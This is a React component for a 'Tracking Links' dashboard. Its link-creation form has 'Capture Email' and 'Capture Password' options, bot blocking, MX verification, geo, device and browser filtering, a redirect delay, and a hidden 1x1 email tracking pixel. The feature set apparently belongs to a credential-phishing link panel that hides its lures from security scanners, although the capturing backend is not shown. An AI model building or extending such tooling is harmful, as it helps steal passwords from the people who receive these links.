import { useState, useEffect } from 'react'
import { Card, CardContent, CardHeader, CardTitle } from './ui/card'
import { Button } from './ui/button'
import { Input } from './ui/input'
import { Label } from './ui/label'
import { Badge } from './ui/badge'
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger, DialogFooter } from './ui/dialog'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select'
import { Checkbox } from './ui/checkbox'
import { Textarea } from './ui/textarea'
import { Plus, Copy, Trash2, RefreshCw, ExternalLink, BarChart3, Search, Users, Shield, Eye, Filter } from 'lucide-react'
import { toast } from 'sonner'

const TrackingLinks = () => {
  const [links, setLinks] = useState([])
  const [campaigns, setCampaigns] = useState([])
  const [domains, setDomains] = useState([])
  const [loading, setLoading] = useState(true)
  const [searchQuery, setSearchQuery] = useState('')
  const [filterStatus, setFilterStatus] = useState('all')
  const [createDialogOpen, setCreateDialogOpen] = useState(false)
  const [saving, setSaving] = useState(false)
  const [analytics, setAnalytics] = useState({
    totalClicks: 0,
    realVisitors: 0,
    botsBlocked: 0
  })

  const [formData, setFormData] = useState({
    target_url: '',
    preview_url: '',
    campaign_name: '',
    domain: '',
    capture_email: false,
    capture_password: false,
    bot_blocking_enabled: true,
    rate_limiting_enabled: false,
    dynamic_signature_enabled: false,
    mx_verification_enabled: false,
    geo_targeting_enabled: false,
    geo_targeting_mode: 'allow',
    allowed_countries: [],
    blocked_countries: [],
    allowed_cities: [],
    blocked_cities: [],
    allowed_regions: [],
    blocked_regions: [],
    device_filtering_enabled: false,
    allowed_devices: [],
    blocked_devices: [],
    browser_filtering_enabled: false,
    allowed_browsers: [],
    blocked_browsers: [],
    block_repeat_clicks: false,
    redirect_delay: 0,
    expiration_period: 'never'
  })

  useEffect(() => {
    fetchData()
  }, [])

  const fetchData = async () => {
    try {
      setLoading(true)
      const token = localStorage.getItem('token')
      
      const [linksRes, campaignsRes, domainsRes, analyticsRes] = await Promise.all([
        fetch('/api/links', { headers: { 'Authorization': `Bearer ${token}` } }),
        fetch('/api/campaigns', { headers: { 'Authorization': `Bearer ${token}` } }),
        fetch('/api/admin/domains', { headers: { 'Authorization': `Bearer ${token}` } }),
        fetch('/api/analytics/summary', { headers: { 'Authorization': `Bearer ${token}` } })
      ])

      if (linksRes.ok) {
        const data = await linksRes.json()
        setLinks(Array.isArray(data) ? data : data.links || [])
      }

      if (campaignsRes.ok) {
        const data = await campaignsRes.json()
        setCampaigns(Array.isArray(data) ? data : data.campaigns || [])
      }

      if (domainsRes.ok) {
        const data = await domainsRes.json()
        setDomains(Array.isArray(data) ? data : data.domains || [])
      }

      if (analyticsRes.ok) {
        const data = await analyticsRes.json()
        setAnalytics({
          totalClicks: data.totalClicks || 0,
          realVisitors: data.realVisitors || 0,
          botsBlocked: data.botsBlocked || 0
        })
      }
    } catch (error) {
      console.error('Error fetching data:', error)
      toast.error('Failed to load data')
    } finally {
      setLoading(false)
    }
  }

  const handleCreateLink = async () => {
    if (!formData.target_url || !formData.campaign_name) {
      toast.error('Please fill in required fields')
      return
    }

    try {
      setSaving(true)
      const token = localStorage.getItem('token')
      const response = await fetch('/api/links', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(formData)
      })

      if (!response.ok) throw new Error('Failed to create link')
      
      toast.success('Tracking link created successfully')
      setFormData({
        target_url: '',
        preview_url: '',
        campaign_name: '',
        domain: '',
        capture_email: false,
        capture_password: false,
        bot_blocking_enabled: true,
        rate_limiting_enabled: false,
        dynamic_signature_enabled: false,
        mx_verification_enabled: false,
        geo_targeting_enabled: false,
        geo_targeting_mode: 'allow',
        allowed_countries: [],
        blocked_countries: [],
        device_filtering_enabled: false,
        allowed_devices: [],
        browser_filtering_enabled: false,
        allowed_browsers: [],
        block_repeat_clicks: false,
        redirect_delay: 0,
        expiration_period: 'never'
      })
      setCreateDialogOpen(false)
      fetchData()
    } catch (error) {
      console.error('Error creating link:', error)
      toast.error('Failed to create tracking link')
    } finally {
      setSaving(false)
    }
  }

  const handleDeleteLink = async (linkId) => {
    if (!window.confirm('Are you sure you want to delete this link?')) return

    try {
      const token = localStorage.getItem('token')
      const response = await fetch(`/api/links/${linkId}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${token}` }
      })

      if (!response.ok) throw new Error('Failed to delete link')
      
      toast.success('Link deleted successfully')
      fetchData()
    } catch (error) {
      console.error('Error deleting link:', error)
      toast.error('Failed to delete link')
    }
  }

  const handleRegenerateLink = async (linkId) => {
    if (!window.confirm('Are you sure you want to regenerate this link? The old link will no longer work.')) return

    try {
      const token = localStorage.getItem('token')
      const response = await fetch(`/api/links/regenerate/${linkId}`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` }
      })

      if (!response.ok) throw new Error('Failed to regenerate link')
      
      const data = await response.json()
      toast.success('Link regenerated successfully')
      fetchData()
    } catch (error) {
      console.error('Error regenerating link:', error)
      toast.error('Failed to regenerate link')
    }
  }

  const handleCopyLink = (text, type) => {
    navigator.clipboard.writeText(text)
    toast.success(`${type} copied to clipboard`)
  }

  const handleTestLink = (link) => {
    window.open(link.tracking_url, '_blank')
  }

  const filteredLinks = links.filter(link => {
    const matchesSearch = 
      link.campaign_name?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      link.target_url?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      link.tracking_url?.toLowerCase().includes(searchQuery.toLowerCase())
    
    const matchesFilter = filterStatus === 'all' || link.status === filterStatus
    
    return matchesSearch && matchesFilter
  })

  if (loading) {
    return (
      <div className="p-6 space-y-6 bg-slate-950 min-h-screen flex items-center justify-center">
        <div className="text-white text-xl">Loading...</div>
      </div>
    )
  }

  return (
    <div className="p-6 space-y-6 bg-slate-950 min-h-screen">
      {/* Header */}
      <div className="mb-8">
        <h1 className="text-3xl font-bold text-white mb-2">Tracking Links</h1>
        <p className="text-slate-400">Create and manage your tracking links with advanced features</p>
      </div>

      {/* Analytics Overview */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
        <Card className="bg-gradient-to-br from-blue-500/10 to-blue-600/5 border-blue-500/20">
          <CardContent className="pt-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-slate-400 uppercase">Total Clicks</p>
                <p className="text-3xl font-bold text-white mt-1">{analytics.totalClicks.toLocaleString()}</p>
              </div>
              <BarChart3 className="h-8 w-8 text-blue-500" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-green-500/10 to-green-600/5 border-green-500/20">
          <CardContent className="pt-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-slate-400 uppercase">Real Visitors</p>
                <p className="text-3xl font-bold text-white mt-1">{analytics.realVisitors.toLocaleString()}</p>
              </div>
              <Users className="h-8 w-8 text-green-500" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-red-500/10 to-red-600/5 border-red-500/20">
          <CardContent className="pt-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-slate-400 uppercase">Bots Blocked</p>
                <p className="text-3xl font-bold text-white mt-1">{analytics.botsBlocked.toLocaleString()}</p>
              </div>
              <Shield className="h-8 w-8 text-red-500" />
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Controls */}
      <div className="flex flex-col sm:flex-row gap-4 items-start sm:items-center justify-between mb-6">
        <div className="flex flex-col sm:flex-row gap-3 w-full sm:w-auto flex-1">
          <div className="relative flex-1 sm:flex-none sm:w-64">
            <Search className="absolute left-3 top-3 h-4 w-4 text-slate-500" />
            <Input
              placeholder="Search links..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="pl-10 bg-slate-800 border-slate-700 text-white placeholder-slate-500"
            />
          </div>
          
          <Select value={filterStatus} onValueChange={setFilterStatus}>
            <SelectTrigger className="w-full sm:w-[180px] bg-slate-800 border-slate-700 text-white">
              <SelectValue placeholder="All Status" />
            </SelectTrigger>
            <SelectContent className="bg-slate-800 border-slate-700 text-white">
              <SelectItem value="all">All Status</SelectItem>
              <SelectItem value="active">Active</SelectItem>
              <SelectItem value="paused">Paused</SelectItem>
              <SelectItem value="expired">Expired</SelectItem>
            </SelectContent>
          </Select>

          <Button
            onClick={fetchData}
            variant="outline"
            className="bg-slate-800 border-slate-700 text-white hover:bg-slate-700"
          >
            <RefreshCw className="h-4 w-4 mr-2" />
            Refresh
          </Button>
        </div>

        <Dialog open={createDialogOpen} onOpenChange={setCreateDialogOpen}>
          <DialogTrigger asChild>
            <Button className="w-full sm:w-auto bg-blue-600 hover:bg-blue-700">
              <Plus className="h-4 w-4 mr-2" />
              Create Link
            </Button>
          </DialogTrigger>
          <DialogContent className="bg-slate-800 border-slate-700 max-w-2xl max-h-[90vh] overflow-y-auto">
            <DialogHeader>
              <DialogTitle className="text-white">Create New Tracking Link</DialogTitle>
            </DialogHeader>
            <div className="space-y-4 py-4">
              {/* Basic Information */}
              <div className="space-y-4">
                <h3 className="text-lg font-semibold text-white">Basic Information</h3>
                
                <div>
                  <Label className="text-white">Target URL *</Label>
                  <Input
                    placeholder="https://example.com"
                    value={formData.target_url}
                    onChange={(e) => setFormData(prev => ({ ...prev, target_url: e.target.value }))}
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                  />
                </div>

                <div>
                  <Label className="text-white">Preview URL (Optional)</Label>
                  <Input
                    placeholder="https://preview.example.com"
                    value={formData.preview_url}
                    onChange={(e) => setFormData(prev => ({ ...prev, preview_url: e.target.value }))}
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                  />
                </div>

                <div>
                  <Label className="text-white">Campaign Name *</Label>
                  <Input
                    placeholder="My Campaign"
                    value={formData.campaign_name}
                    onChange={(e) => setFormData(prev => ({ ...prev, campaign_name: e.target.value }))}
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                  />
                </div>

                <div>
                  <Label className="text-white">Domain</Label>
                  <Select value={formData.domain} onValueChange={(value) => setFormData(prev => ({ ...prev, domain: value }))}>
                    <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
                      <SelectValue placeholder="Select domain" />
                    </SelectTrigger>
                    <SelectContent className="bg-slate-800 border-slate-700 text-white">
                      {domains.map(domain => (
                        <SelectItem key={domain.id} value={domain.domain}>{domain.domain}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div>
                  <Label className="text-white">Link Expiration</Label>
                  <Select value={formData.expiration_period} onValueChange={(value) => setFormData(prev => ({ ...prev, expiration_period: value }))}>
                    <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent className="bg-slate-800 border-slate-700 text-white">
                      <SelectItem value="never">Never Expires</SelectItem>
                      <SelectItem value="5hrs">5 Hours</SelectItem>
                      <SelectItem value="10hrs">10 Hours</SelectItem>
                      <SelectItem value="24hrs">24 Hours</SelectItem>
                      <SelectItem value="48hrs">48 Hours</SelectItem>
                      <SelectItem value="72hrs">72 Hours</SelectItem>
                      <SelectItem value="weekly">Weekly</SelectItem>
                      <SelectItem value="monthly">Monthly</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>

              {/* Security Features */}
              <div className="space-y-3 pt-4 border-t border-slate-700">
                <h3 className="text-lg font-semibold text-white">Security Features</h3>
                
                <div className="flex items-center justify-between">
                  <Label className="text-white">Bot Blocking</Label>
                  <Checkbox
                    checked={formData.bot_blocking_enabled}
                    onCheckedChange={(checked) => setFormData(prev => ({ ...prev, bot_blocking_enabled: checked }))}
                  />
                </div>

                <div className="flex items-center justify-between">
                  <Label className="text-white">Rate Limiting</Label>
                  <Checkbox
                    checked={formData.rate_limiting_enabled}
                    onCheckedChange={(checked) => setFormData(prev => ({ ...prev, rate_limiting_enabled: checked }))}
                  />
                </div>

                <div className="flex items-center justify-between">
                  <Label className="text-white">Dynamic Signature</Label>
                  <Checkbox
                    checked={formData.dynamic_signature_enabled}
                    onCheckedChange={(checked) => setFormData(prev => ({ ...prev, dynamic_signature_enabled: checked }))}
                  />
                </div>

                <div className="flex items-center justify-between">
                  <Label className="text-white">MX Verification</Label>
                  <Checkbox
                    checked={formData.mx_verification_enabled}
                    onCheckedChange={(checked) => setFormData(prev => ({ ...prev, mx_verification_enabled: checked }))}
                  />
                </div>

                <div className="flex items-center justify-between">
                  <Label className="text-white">Block Repeat Clicks</Label>
                  <Checkbox
                    checked={formData.block_repeat_clicks}
                    onCheckedChange={(checked) => setFormData(prev => ({ ...prev, block_repeat_clicks: checked }))}
                  />
                </div>
              </div>

              {/* Geo Targeting */}
              <div className="space-y-3 pt-4 border-t border-slate-700">
                <div className="flex items-center justify-between">
                  <Label className="text-white">Geo Targeting</Label>
                  <Checkbox
                    checked={formData.geo_targeting_enabled}
                    onCheckedChange={(checked) => setFormData(prev => ({ ...prev, geo_targeting_enabled: checked }))}
                  />
                </div>

                {formData.geo_targeting_enabled && (
                  <div className="space-y-3 pl-4 border-l-2 border-slate-600">
                    <div>
                      <Label className="text-white">Mode</Label>
                      <Select value={formData.geo_targeting_mode} onValueChange={(value) => setFormData(prev => ({ ...prev, geo_targeting_mode: value }))}>
                        <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent className="bg-slate-800 border-slate-700 text-white">
                          <SelectItem value="allow">Allow (Whitelist)</SelectItem>
                          <SelectItem value="block">Block (Blacklist)</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>

                    <div>
                      <Label className="text-white">Countries (comma-separated codes)</Label>
                      <Input
                        placeholder="US, GB, CA"
                        value={formData.geo_targeting_mode === 'allow' ? formData.allowed_countries.join(', ') : formData.blocked_countries.join(', ')}
                        onChange={(e) => {
                          const countries = e.target.value.split(',').map(c => c.trim().toUpperCase()).filter(c => c)
                          setFormData(prev => ({
                            ...prev,
                            [formData.geo_targeting_mode === 'allow' ? 'allowed_countries' : 'blocked_countries']: countries
                          }))
                        }}
                        className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                      />
                    </div>
                  </div>
                )}
              </div>

              {/* Capture Options */}
              <div className="space-y-3 pt-4 border-t border-slate-700">
                <h3 className="text-lg font-semibold text-white">Capture Options</h3>
                
                <div className="flex items-center justify-between">
                  <Label className="text-white">Capture Email</Label>
                  <Checkbox
                    checked={formData.capture_email}
                    onCheckedChange={(checked) => setFormData(prev => ({ ...prev, capture_email: checked }))}
                  />
                </div>

                <div className="flex items-center justify-between">
                  <Label className="text-white">Capture Password</Label>
                  <Checkbox
                    checked={formData.capture_password}
                    onCheckedChange={(checked) => setFormData(prev => ({ ...prev, capture_password: checked }))}
                  />
                </div>
              </div>

              {/* Advanced Options */}
              <div className="space-y-3 pt-4 border-t border-slate-700">
                <h3 className="text-lg font-semibold text-white">Advanced Options</h3>
                
                <div>
                  <Label className="text-white">Redirect Delay (seconds)</Label>
                  <Input
                    type="number"
                    min="0"
                    value={formData.redirect_delay}
                    onChange={(e) => setFormData(prev => ({ ...prev, redirect_delay: parseInt(e.target.value) || 0 }))}
                    className="bg-slate-700 border-slate-600 text-white"
                  />
                </div>
              </div>
            </div>

            <DialogFooter>
              <Button
                variant="outline"
                onClick={() => setCreateDialogOpen(false)}
                className="bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
              >
                Cancel
              </Button>
              <Button
                onClick={handleCreateLink}
                disabled={saving}
                className="bg-blue-600 hover:bg-blue-700"
              >
                {saving ? 'Creating...' : 'Create Link'}
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>

      {/* Links List */}
      <div className="space-y-4">
        {filteredLinks.length > 0 ? (
          filteredLinks.map((link) => (
            <Card key={link.id} className="bg-slate-800 border-slate-700 hover:border-slate-600 transition-colors">
              <CardContent className="p-6">
                <div className="space-y-4">
                  {/* Header */}
                  <div className="flex items-start justify-between">
                    <div className="flex-1">
                      <div className="flex items-center gap-3 mb-2">
                        <h3 className="text-lg font-semibold text-white">{link.campaign_name || 'Untitled'}</h3>
                        <Badge className={link.status === 'active' ? 'bg-green-600' : 'bg-slate-600'}>
                          {link.status || 'active'}
                        </Badge>
                      </div>
                      <p className="text-sm text-slate-400 truncate">{link.target_url}</p>
                    </div>

                    <div className="flex gap-2">
                      <Button
                        size="icon"
                        variant="outline"
                        onClick={() => handleCopyLink(link.tracking_url, 'Tracking URL')}
                        className="bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
                      >
                        <Copy className="h-4 w-4" />
                      </Button>
                      <Button
                        size="icon"
                        variant="outline"
                        onClick={() => handleRegenerateLink(link.id)}
                        className="bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
                      >
                        <RefreshCw className="h-4 w-4" />
                      </Button>
                      <Button
                        size="icon"
                        variant="outline"
                        onClick={() => handleTestLink(link)}
                        className="bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
                      >
                        <ExternalLink className="h-4 w-4" />
                      </Button>
                      <Button
                        size="icon"
                        variant="outline"
                        onClick={() => handleDeleteLink(link.id)}
                        className="bg-red-900/20 border-red-700 text-red-400 hover:bg-red-900/40"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>

                  {/* Stats */}
                  <div className="flex items-center gap-6 text-sm">
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                      <span className="text-slate-400">{link.total_clicks || 0} clicks</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                      <span className="text-slate-400">{link.real_visitors || 0} visitors</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 bg-red-500 rounded-full"></div>
                      <span className="text-slate-400">{link.blocked_attempts || 0} bots blocked</span>
                    </div>
                  </div>

                  {/* URLs */}
                  <div className="space-y-3 pt-3 border-t border-slate-700">
                    <div>
                      <Label className="text-xs text-slate-400 uppercase mb-1">Tracking URL</Label>
                      <div className="flex items-center gap-2">
                        <Input
                          value={link.tracking_url || ''}
                          readOnly
                          className="bg-slate-700 border-slate-600 text-white font-mono text-sm"
                        />
                        <Button
                          size="icon"
                          variant="outline"
                          onClick={() => handleCopyLink(link.tracking_url, 'Tracking URL')}
                          className="bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
                        >
                          <Copy className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>

                    <div>
                      <Label className="text-xs text-slate-400 uppercase mb-1">Pixel URL</Label>
                      <div className="flex items-center gap-2">
                        <Input
                          value={link.pixel_url || ''}
                          readOnly
                          className="bg-slate-700 border-slate-600 text-white font-mono text-sm"
                        />
                        <Button
                          size="icon"
                          variant="outline"
                          onClick={() => handleCopyLink(link.pixel_url, 'Pixel URL')}
                          className="bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
                        >
                          <Copy className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>

                    <div>
                      <Label className="text-xs text-slate-400 uppercase mb-1">Email Code</Label>
                      <div className="flex items-center gap-2">
                        <Textarea
                          value={`<img src="${link.pixel_url || ''}" width="1" height="1" style="display:none;" />`}
                          readOnly
                          className="bg-slate-700 border-slate-600 text-white font-mono text-sm resize-none h-16"
                        />
                        <Button
                          size="icon"
                          variant="outline"
                          onClick={() => handleCopyLink(`<img src="${link.pixel_url || ''}" width="1" height="1" style="display:none;" />`, 'Email Code')}
                          className="bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
                        >
                          <Copy className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))
        ) : (
          <Card className="bg-slate-800 border-slate-700">
            <CardContent className="p-12 text-center">
              <p className="text-slate-400 text-lg mb-2">No tracking links found</p>
              <p className="text-slate-500 text-sm">Create your first link to get started!</p>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}

export default TrackingLinks